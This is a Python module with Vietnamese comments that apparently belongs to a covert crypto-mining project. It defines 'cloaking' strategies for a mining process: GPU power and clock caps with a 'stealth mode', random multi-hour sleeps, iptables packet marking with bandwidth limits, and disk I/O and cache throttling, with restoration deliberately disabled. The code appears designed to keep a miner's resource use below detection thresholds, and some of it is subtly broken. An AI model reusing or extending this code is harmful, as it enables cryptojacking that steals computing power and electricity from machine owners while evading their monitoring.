"""
Module cloak_strategies.py - Các chiến lược cloaking cho tiến trình khai thác (đồng bộ).
CHÚ Ý: Phiên bản này đã loại bỏ hoàn toàn chức năng restoration - chỉ cloaking.
"""
# type: ignore

import logging
import traceback
import psutil
import threading
import time
import random
from abc import ABC, abstractmethod
from typing import Dict, List, Any, Optional, Type, cast, TYPE_CHECKING
from pathlib import Path

from .utils import MiningProcess

# ✅ UNIFIED LOGGING: Use centralized logging system
from .unified_logging import get_unified_logger

# ✅ ERROR MANAGEMENT: Use centralized error handling system
from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error

# ✅ STANDARDIZED: Get unified logger instance (khớp hierarchy)
cloak_logger = get_unified_logger('mining_environment.cloak_strategies')

# ✅ ERROR REPORTER: Get centralized error reporter instance
error_reporter = get_error_reporter()

# **GPU-Only Mode**: CPU ResourceManager removed for GPU-only operations
if TYPE_CHECKING:
    class GPUResourceManager: ...
    class NetworkResourceManager: ...
    class DiskIOResourceManager: ...
    class CacheResourceManager: ...
    class MemoryResourceManager: ...
else:
    GPUResourceManager = Any  # type: ignore
    NetworkResourceManager = Any  # type: ignore
    DiskIOResourceManager = Any  # type: ignore
    CacheResourceManager = Any  # type: ignore
    MemoryResourceManager = Any  # type: ignore


###############################################################################
#                    STRATEGY TYPES & UNIFIED ARCHITECTURE                   #
###############################################################################

class StrategyType:
    """
    ✅ **GPU-Only Mode**: Các loại chiến lược cloaking cho GPU-only resource control.
    5 active strategies: GPU (with thermal), Network, Disk I/O, Cache, Memory
    """
    # CPU strategy removed for GPU-only operations
    GPU = "gpu"
    NETWORK = "network"
    DISK_IO = "disk_io"
    CACHE = "cache"
    MEMORY = "memory"
    THERMAL_CONTROL = "thermal_control"  # ⚠️ DEPRECATED: Unified vào GPU strategy

###############################################################################
#                           CƠ SỞ CỦA CÁC STRATEGY                            #
###############################################################################

class CloakStrategy(ABC):
    """
    ✅ ENHANCED: Lớp cơ sở trừu tượng cho comprehensive multi-strategy cloaking.
    Redesigned cho comprehensive resource cloaking với advanced coordination.
    """

    logger: logging.Logger  # thêm attribute để linter biết
    privileged_manager: Optional[Any] = None  # Để inject privileged operations
    strategy_type: str = ""  # **GPU-Only**: Loại chiến lược (GPU, Network, Disk I/O, Cache, Memory)
    requires_plugin_system: bool = False  # Có yêu cầu plugin system không
    
    # ✅ NEW: Comprehensive cloaking attributes
    is_primary_strategy: bool = False  # Có phải primary strategy không
    coordination_priority: int = 50  # Priority for multi-strategy coordination (0-100)
    resource_conflicts: List[str] = []  # List of resource types that may conflict
    depends_on_strategies: List[str] = []  # Strategies this one depends on
    
    # ✅ NEW: Performance and compatibility attributes
    supports_concurrent_application: bool = True  # Có thể apply cùng lúc với strategies khác
    estimated_application_time_ms: int = 100  # Estimated time to apply strategy
    compatibility_matrix: Dict[str, str] = {}  # Compatibility với other strategies

    def set_privileged_manager(self, privileged_manager: Any) -> None:
        """
        Inject PrivilegedOperationManager vào strategy
        """
        self.privileged_manager = privileged_manager
        if hasattr(self, 'logger'):
            self.logger.debug(f"Injected privileged_manager into {self.__class__.__name__}")

    @abstractmethod
    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng chiến lược cloaking cho tiến trình với return value validation.

        :param process: Đối tượng MiningProcess.
        :return: bool - True nếu strategy áp dụng thành công, False nếu thất bại
        """
        pass

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục cài đặt ban đầu cho tiến trình (đồng bộ).
        CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        
        :param process: Đối tượng MiningProcess.
        :return: None
        """
        self.logger.info(f"[RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
        pass

    # ✅ NEW: Comprehensive cloaking support methods
    def pre_apply_check(self, process: MiningProcess) -> bool:
        """
        ✅ NEW: Pre-application compatibility check cho comprehensive cloaking.
        
        :param process: Đối tượng MiningProcess để check compatibility
        :return: True nếu strategy có thể áp dụng an toàn
        """
        try:
            # Base implementation - các subclasses có thể override
            return True
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.debug(f"Pre-apply check failed for {self.__class__.__name__}: {e}")
            return False

    def post_apply_verification(self, process: MiningProcess) -> bool:
        """
        ✅ NEW: Post-application verification cho comprehensive cloaking.
        
        :param process: Đối tượng MiningProcess để verify
        :return: True nếu strategy đã được áp dụng thành công
        """
        try:
            # Base implementation - các subclasses có thể override
            return True
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.debug(f"Post-apply verification failed for {self.__class__.__name__}: {e}")
            return False

    def check_resource_conflicts(self, other_strategies: List[str]) -> List[str]:
        """
        ✅ NEW: Check potential resource conflicts với other strategies.
        
        :param other_strategies: List of strategy names đang được áp dụng
        :return: List of potential conflicts
        """
        conflicts = []
        for strategy in other_strategies:
            if strategy in self.resource_conflicts:
                conflicts.append(strategy)
        return conflicts

    def get_strategy_metadata(self) -> Dict[str, Any]:
        """
        ✅ NEW: Get metadata về strategy cho comprehensive coordination.
        
        :return: Dictionary chứa strategy metadata
        """
        return {
            'strategy_type': self.strategy_type,
            'is_primary': self.is_primary_strategy,
            'priority': self.coordination_priority,
            'conflicts': self.resource_conflicts,
            'dependencies': self.depends_on_strategies,
            'concurrent_safe': self.supports_concurrent_application,
            'estimated_time_ms': self.estimated_application_time_ms,
            'compatibility': self.compatibility_matrix
        }

###############################################################################
#                              GPU STRATEGIES                                  #
###############################################################################

###############################################################################
#                 GPU STRATEGY: GpuCloakStrategy                              #
###############################################################################

class GpuCloakStrategy(CloakStrategy):
    """
    ✅ UNIFIED: Comprehensive GPU cloaking với integrated thermal management:
      - Giới hạn power limit,
      - Set xung nhịp,
      - Integrated thermal monitoring và protection
      - Advanced thermal throttling với emergency protection
    
    UNIFIED strategy eliminates need for separate ThermalControlStrategy.
    """
    
    strategy_type = StrategyType.GPU
    
    # ✅ UNIFIED: Comprehensive cloaking attributes
    is_primary_strategy = True  # GPU cloaking is PRIMARY for GPU processes
    coordination_priority = 100  # Highest priority for GPU processes
    resource_conflicts = []  # ✅ NO CONFLICTS - integrated thermal management
    depends_on_strategies = []  # No dependencies
    supports_concurrent_application = True  # Safe to apply with other strategies
    estimated_application_time_ms = 400  # GPU + thermal control ~400ms
    requires_plugin_system = True  # GPU strategies require plugin system

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        gpu_resource_manager: GPUResourceManager
    ):
        """
        ✅ UNIFIED: Khởi tạo comprehensive GPU cloaking với integrated thermal management.

        :param config: Cấu hình cloaking GPU (dict).
        :param logger: Logger.
        :param gpu_resource_manager: ResourceManager liên quan đến GPU.
        """
        self.logger = logger
        self.config = config

        # ✅ FALLBACK: If GPUResourceManager not provided, create on-demand
        if gpu_resource_manager is None:
            self.logger.warning("⚠️ GPUResourceManager is None – creating fallback instance (on-demand)")
            try:
                # Tránh import vòng lặp
                from mining_environment.scripts.resource_control import GPUResourceManager as _GPUResourceManager
                from mining_environment.scripts.unified_logging import get_unified_logger

                fallback_logger = get_unified_logger('resource_control')
                gpu_resource_manager = _GPUResourceManager(config, fallback_logger)
                self.logger.info("✅ Fallback GPUResourceManager created successfully")
            except Exception as err:
                self.logger.error(f"❌ Failed to create fallback GPUResourceManager: {err}")
                gpu_resource_manager = None

        self.gpu_resource_manager = cast(Any, gpu_resource_manager)

        self.stop_monitoring = False  # Thêm thuộc tính stop_monitoring

        # Tên tiến trình GPU trong config
        self.allowed_process_name = config.get("processes", {}).get("GPU", "")
        if not self.allowed_process_name:
            self.logger.warning("Không tìm thấy cấu hình tiến trình GPU (key='GPU') trong config.")

        # ✅ UNIFIED: GPU Performance Control với Stealth Mode Support
        # Check for stealth_mode configuration first
        self.stealth_mode = config.get('stealth_mode', False)
        if self.stealth_mode:
            # Apply stealth_mode profile: power_limit=80% → throttle_percentage=20%
            self.throttle_percentage = 20  # 80% power → 20% reduction
            self.logger.info("🔒 [STEALTH MODE] Activated - power_limit=80%, throttle=20%")
        else:
            self.throttle_percentage = config.get('throttle_percentage', 20)
            
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            self.logger.warning("throttle_percentage GPU không hợp lệ, mặc định=20%.")
            self.throttle_percentage = 20

        self.target_sm_clock = config.get('sm_clock', 1240)
        
        # ✅ UNIFIED: Integrated Thermal Management Configuration
        self.gpu_temp_threshold = config.get('gpu_temp_threshold', 75)  # °C
        self.emergency_shutdown_temp = config.get('emergency_shutdown_temp', 90)  # °C
        self.thermal_throttle_step = config.get('thermal_throttle_step', 10)  # % reduction
        self.aggressive_cooling = config.get('aggressive_cooling', False)
        
        # ✅ UNIFIED: Thermal monitoring enables
        self.enable_thermal_monitoring = config.get('enable_thermal_monitoring', True)
        self.thermal_check_interval = config.get('thermal_check_interval', 5)  # seconds
        self.target_mem_clock = config.get('mem_clock', 877)
        
        # ✅ SMART CLOAKING: Conditional logic parameters
        self.adaptive_throttling = config.get('adaptive_throttling', True)
        self.smart_power_scaling = config.get('smart_power_scaling', True)
        self.emergency_fallback = config.get('emergency_fallback', True)

        self.temperature_threshold = config.get('temperature_threshold', 80)
        if self.temperature_threshold <= 0:
            self.logger.warning("temperature_threshold không hợp lệ, mặc định=80.")
            self.temperature_threshold = 80

    def _limit_temperature_and_random_sleep(self, pid: int, gpu_count: int) -> None:
        """
        Hàm nội bộ để:
          - Giới hạn nhiệt độ cho mỗi GPU (nếu cần)
          - Ngủ một khoảng thời gian ngẫu nhiên (chỉ gọi 1 lần).
        """
        # --- Giới hạn nhiệt độ ---
        for gpu_index in range(gpu_count):
            if self.stop_monitoring:
                self.logger.info("[GPU Cloaking] Dừng giám sát nhiệt độ do yêu cầu khôi phục tài nguyên.")
                break

            success_temp = self.gpu_resource_manager.limit_temperature(
                gpu_index=gpu_index,
                temperature_threshold=self.temperature_threshold,
                fan_speed_increase=0  # Không tăng tốc độ quạt
            )
            if success_temp:
                self.logger.info(f"[GPU Cloaking] Giới hạn nhiệt độ cho GPU={gpu_index} (PID={pid}).")
            else:
                self.logger.error(f"[GPU Cloaking] Không thể giới hạn nhiệt độ cho GPU={gpu_index}.")

        # --- Ngủ ngẫu nhiên ---
        INTERVAL_CHOICES = [
            (300, 600),    # 5 - 10 phút
            (600, 1200),   # 10 - 20 phút
            (1200, 1800),  # 20 - 30 phút
            (1800, 3600),  # 30 - 60 phút
            (3600, 7200),  # 60 - 120 phút
        ]
        chosen_range = random.choice(INTERVAL_CHOICES)  # ví dụ (600, 1800)
        random_sleep_sec = random.randint(*chosen_range)

        self.logger.debug(
            f"[GPU Cloaking] Ngủ {random_sleep_sec} giây (được chọn từ {chosen_range}) sau khi limit nhiệt độ."
        )
        time.sleep(random_sleep_sec)
        
    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ UNIFIED: Áp dụng GPU cloaking với metadata-aware optimization và return validation.
        
        :param process: Enhanced MiningProcess với classification metadata.
        :return: bool - True nếu GPU cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            # ✅ SAFETY CHECK: Ensure gpu_resource_manager ready
            if self.gpu_resource_manager is None:
                self.logger.error("💀 GPUResourceManager not available – aborting gpu_cloaking apply")
                return False

            pid, name = process.pid, process.name

            self.logger.info(f"🎮 [Unified GPU Cloaking] Processing {name} (PID={pid}) with integrated thermal control")

            # --- CHỈ ÁP DỤNG CHO TIẾN TRÌNH ĐÚNG TÊN ĐƯỢC CẤU HÌNH ---
            if self.allowed_process_name and name != self.allowed_process_name:
                self.logger.debug(
                    f"[GPU Cloaking] Bỏ qua tiến trình '{name}' (PID={pid}) do không khớp tên GPU trong config."
                )
                return

            gpu_count = self.gpu_resource_manager.get_gpu_count()
            if gpu_count == 0:
                self.logger.warning("[GPU Cloaking] Hệ thống không có GPU. Bỏ qua cloaking.")
                return

            # Giới hạn power + set clocks cho mỗi GPU
            for gpu_index in range(gpu_count):
                current_pl = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
                if current_pl is None:
                    self.logger.error(f"[GPU Cloaking] Không thể lấy power limit cho GPU={gpu_index}.")
                    continue

                # Bỏ qua nếu công suất hiện tại đã thấp hơn 100W
                if current_pl <= 100:
                    self.logger.warning(f"[GPU Cloaking] GPU={gpu_index} => power={current_pl}W (PID={pid}).")
                    continue
                
                desired_pl = int(round(current_pl * (1 - self.throttle_percentage / 100)))
                
                # Sử dụng privileged_manager nếu có cho GPU clock control
                if self.privileged_manager:
                    clock_success = self.privileged_manager.set_gpu_clock_limits(
                        gpu_id=gpu_index,
                        sm_clock=self.target_sm_clock,
                        mem_clock=self.target_mem_clock
                    )
                    if clock_success:
                        self.logger.info(f"🔐 [GPU Cloaking] Set clocks via privileged_manager for GPU={gpu_index}")
                
                ok_pl = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, desired_pl)
                if ok_pl:
                    self.logger.info(f"[GPU Cloaking] GPU={gpu_index} => power={desired_pl}W (PID={pid}).")
                else:
                    self.logger.error(f"[GPU Cloaking] Không thể giới hạn power limit cho GPU={gpu_index}.")

            # ✅ UNIFIED: Integrated thermal management (không cần separate thread)
            if self.enable_thermal_monitoring:
                self._apply_integrated_thermal_management(pid, gpu_count)
            
            self.logger.info(f"✅ [Unified GPU Cloaking] Applied comprehensive GPU control for {name}(PID={pid})")
            return True  # ✅ SUCCESS: GPU cloaking completed successfully

        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"GPU Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='GpuCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='GPU',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"GPU Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"GPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='GpuCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='GPU',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"GPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi cloaking GPU cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='GpuCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='GPU',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi cloaking GPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: GPU cloaking failed
            
    def _apply_integrated_thermal_management(self, pid: int, gpu_count: int) -> None:
        """
        ✅ UNIFIED: Integrated thermal management trong GPU cloaking strategy.
        
        Eliminates need for separate ThermalControlStrategy.
        """
        try:
            self.logger.info(f"🌡️ [Integrated Thermal] Applying thermal management for PID={pid}")
            
            for gpu_index in range(gpu_count):
                try:
                    # Get current temperature
                    current_temp = self.gpu_resource_manager.get_gpu_temperature(gpu_index)
                    if current_temp is None:
                        continue
                        
                    self.logger.debug(f"🌡️ [Thermal] GPU {gpu_index}: {current_temp}°C (threshold: {self.gpu_temp_threshold}°C)")
                    
                    # Apply thermal responses
                    if current_temp >= self.emergency_shutdown_temp:
                        self._apply_emergency_thermal_protection(gpu_index, pid)
                    elif current_temp >= self.gpu_temp_threshold:
                        self._apply_progressive_thermal_throttling(gpu_index, current_temp, pid)
                    else:
                        self.logger.debug(f"✅ [Thermal] GPU {gpu_index} temperature normal")
                        
                except Exception as gpu_error:
                    self.logger.error(f"❌ [Thermal] Error processing GPU {gpu_index}: {gpu_error}")
                    
        except Exception as e:
            self.logger.error(f"❌ [Integrated Thermal] Thermal management error: {e}")

    def _apply_progressive_thermal_throttling(self, gpu_index: int, current_temp: float, pid: int) -> None:
        """Progressive thermal throttling based on temperature overshoot"""
        try:
            temp_overshoot = current_temp - self.gpu_temp_threshold
            throttle_intensity = min(50, int(temp_overshoot * 2))
            
            current_power = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
            if current_power:
                reduced_power = int(current_power * (100 - throttle_intensity) / 100)
                success = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, reduced_power)
                
                if success:
                    self.logger.warning(f"🌡️ [Thermal Throttle] GPU {gpu_index}: {current_power}W → {reduced_power}W")
                else:
                    self.logger.error(f"❌ [Thermal] Failed throttling GPU {gpu_index}")
                    
        except Exception as e:
            self.logger.error(f"❌ [Thermal Throttle] Error: {e}")

    def _apply_emergency_thermal_protection(self, gpu_index: int, pid: int) -> None:
        """Emergency thermal protection measures"""
        try:
            self.logger.error(f"🚨 [EMERGENCY THERMAL] GPU {gpu_index} emergency protection")
            
            min_power_limit = 100  # Minimum safe power
            success = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, min_power_limit)
            
            if success:
                self.logger.error(f"🚨 [EMERGENCY] GPU {gpu_index} power → {min_power_limit}W")
            else:
                self.logger.error(f"💀 [EMERGENCY] Failed emergency protection GPU {gpu_index}")
                
        except Exception as e:
            self.logger.error(f"💀 [EMERGENCY] Error: {e}")

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục GPU - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[GPU RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#            NETWORK STRATEGY: NetworkCloakStrategy                           #
###############################################################################

class NetworkCloakStrategy(CloakStrategy):
    """
    ✅ ENHANCED: Cloaking mạng cho comprehensive multi-strategy environment:
      - Đánh dấu pid bằng iptables,
      - Giới hạn băng thông (tc).
    
    Enhanced cho comprehensive cloaking với network isolation.
    """
    
    strategy_type = StrategyType.NETWORK
    requires_plugin_system = False  # Network strategies execute directly
    
    # ✅ NEW: Comprehensive cloaking attributes
    is_primary_strategy = False  # Network is SECONDARY strategy
    coordination_priority = 70  # Medium-high priority
    resource_conflicts = []  # No direct conflicts with other strategies
    depends_on_strategies = []  # Independent of other strategies
    supports_concurrent_application = True  # Safe to apply with any other strategy
    estimated_application_time_ms = 200  # iptables + tc commands ~200ms

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        network_resource_manager: NetworkResourceManager
    ):
        """
        Khởi tạo NetworkCloakStrategy.

        :param config: Cấu hình cloaking Network (dict).
        :param logger: Logger.
        :param network_resource_manager: ResourceManager liên quan đến Network.
        """
        self.logger = logger
        self.config = config
        self.network_resource_manager = cast(Any, network_resource_manager)

        self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 700)
        if self.bandwidth_reduction_mbps <= 0:
            self.logger.warning("bandwidth_reduction_mbps không hợp lệ, mặc định=500.")
            self.bandwidth_reduction_mbps = 700

        self.network_interface = config.get('network_interface') or "eth0"
        self.process_marks: Dict[int, int] = {}

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng network cloaking với return value validation.
        
        :param process: Đối tượng MiningProcess.
        :return: bool - True nếu network cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name
            mark = pid % 32768  # Dùng pid để tạo mark

            ok_mark = self.network_resource_manager.mark_packets(pid, mark)
            if not ok_mark:
                self.logger.error(f"[Net Cloaking] Không thể MARK iptables cho PID={pid}.")
                return False  # ✅ FAILURE: Cannot mark packets

            ok_limit = self.network_resource_manager.limit_bandwidth(
                self.network_interface, mark, self.bandwidth_reduction_mbps
            )
            if not ok_limit:
                self.logger.error(f"[Net Cloaking] Giới hạn băng thông thất bại (iface={self.network_interface}).")
                return False  # ✅ FAILURE: Cannot limit bandwidth

            self.process_marks[pid] = mark
            self.logger.info(f"[Net Cloaking] Limit={self.bandwidth_reduction_mbps}Mbps cho PID={pid}, iface={self.network_interface}.")

            # Rollback mark_packets
            self.network_resource_manager.unmark_packets(pid, mark)
            return True  # ✅ SUCCESS: Network cloaking applied successfully

        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"Net Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='NetworkCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Network',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Net Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='NetworkCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Network',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='NetworkCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Network',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Network cloaking failed

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục Network - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[NETWORK RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#            DISK IO STRATEGY: DiskIoCloakStrategy                            #
###############################################################################
class DiskIoCloakStrategy(CloakStrategy):
    """
    Cloaking Disk I/O (đồng bộ) qua ionice hoặc cgroup I/O (tuỳ triển khai).
    
    Redesigned theo blueprint với direct execution.
    """
    
    strategy_type = StrategyType.DISK_IO
    requires_plugin_system = False  # Disk I/O strategies execute directly

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        disk_io_resource_manager: DiskIOResourceManager
    ):
        """
        Khởi tạo DiskIoCloakStrategy.

        :param config: Cấu hình cloaking Disk IO (dict).
        :param logger: Logger.
        :param disk_io_resource_manager: ResourceManager liên quan đến Disk I/O.
        """
        self.logger = logger
        self.config = config
        self.disk_io_resource_manager = cast(Any, disk_io_resource_manager)

        self.io_weight = config.get('io_weight', 3)
        if not isinstance(self.io_weight, int) or not (0 <= self.io_weight <= 7):
            self.logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định=3.")
            self.io_weight = 3

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng Disk I/O cloaking với return value validation.

        :param process: Đối tượng MiningProcess.
        :return: bool - True nếu Disk I/O cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name
            ok = self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
            if ok:
                self.logger.info(f"[DiskIO Cloaking] PID={pid}, io_weight={self.io_weight}.")
                return True  # ✅ SUCCESS: Disk I/O cloaking applied successfully
            else:
                self.logger.error(f"[DiskIO Cloaking] Không thể set io_weight cho PID={pid}.")
                return False  # ✅ FAILURE: Cannot set I/O weight
        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"DiskIO Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='DiskIoCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='DiskIO',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"DiskIO Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='DiskIoCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='DiskIO',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='DiskIoCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='DiskIO',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Disk I/O cloaking failed

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục DiskIO - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[DISKIO RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#            CACHE STRATEGY: CacheCloakStrategy                               #
###############################################################################
class CacheCloakStrategy(CloakStrategy):
    """
    Cloaking Cache (đồng bộ):
      - Drop caches,
      - Giới hạn cache usage.
    
    Redesigned theo blueprint với direct execution.
    """
    
    strategy_type = StrategyType.CACHE
    requires_plugin_system = False  # Cache strategies execute directly

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cache_resource_manager: CacheResourceManager
    ):
        """
        Khởi tạo CacheCloakStrategy.

        :param config: Cấu hình cloaking Cache (dict).
        :param logger: Logger.
        :param cache_resource_manager: ResourceManager liên quan đến Cache.
        """
        self.logger = logger
        self.config = config
        self.cache_resource_manager = cast(Any, cache_resource_manager)

        self.cache_limit_percent = config.get('cache_limit_percent', 50)
        if not (0 <= self.cache_limit_percent <= 100):
            self.logger.warning(f"cache_limit_percent={self.cache_limit_percent} không hợp lệ, mặc định=50%.")
            self.cache_limit_percent = 50

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng Cache cloaking với return value validation.

        :param process: Đối tượng MiningProcess.
        :return: bool - True nếu Cache cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name
            ok = self.cache_resource_manager.limit_cache_usage(self.cache_limit_percent, pid)
            if ok:
                self.logger.info(f"[Cache Cloaking] PID={pid}, cache_limit={self.cache_limit_percent}%.")
                return True  # ✅ SUCCESS: Cache cloaking applied successfully
            else:
                self.logger.error(f"[Cache Cloaking] Không thể set cache_limit cho PID={pid}.")
                return False  # ✅ FAILURE: Cannot set cache limit
        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"Cache Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='CacheCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Cache',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Cache Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='CacheCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Cache',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='CacheCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Cache',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Cache cloaking failed

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục Cache - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[CACHE RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
